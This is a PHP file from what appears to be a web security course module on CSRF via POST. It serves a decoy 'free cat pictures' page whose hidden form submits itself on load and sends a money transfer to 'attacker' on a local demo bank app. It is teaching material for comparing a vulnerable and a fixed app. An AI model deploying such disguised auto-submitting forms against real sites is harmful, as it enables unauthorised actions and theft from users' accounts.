<?php

/**
 * router.php (the "attacker site" -- auto-submitting form)
 *
 * Module 10: CSRF via POST.
 *
 * PHP equivalent of node/attacker/server.js -- identical hidden,
 * auto-submitting form. Used against both bank-vulnerable and
 * bank-fixed to compare outcomes.
 *
 * Introduced in: Module 10.
 * Prerequisite concepts: Module 09 (CSRF via GET).
 */

declare(strict_types=1);

header('Content-Type: text/html; charset=utf-8');
echo <<<'HTML'
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Free Cat Pictures</title></head>
<body style="font-family:sans-serif;max-width:640px;margin:40px auto;">
  <h1>100% Legitimate Free Cat Pictures (PHP)</h1>
  <p>Still just cats. Nothing to see here.</p>
  <form id="csrf-form" method="post" action="http://localhost:8000/transfer" style="display:none">
    <input name="to" value="attacker">
    <input name="amount" value="250">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body></html>
HTML;
